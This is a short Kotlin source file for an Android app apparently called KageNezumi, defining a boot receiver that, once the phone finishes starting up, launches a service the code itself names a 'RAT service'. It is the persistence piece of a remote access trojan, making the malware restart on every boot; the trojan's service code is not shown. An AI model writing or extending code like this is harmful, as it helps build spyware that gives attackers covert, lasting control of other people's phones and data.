package com.example.kagenezumi

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            Log.d("KageNezumi", "Boot completed - starting RAT service")
            val serviceIntent = Intent(context, RatService::class.java)
            context.startForegroundService(serviceIntent)  // Required for Android 8+
        }
    }
}
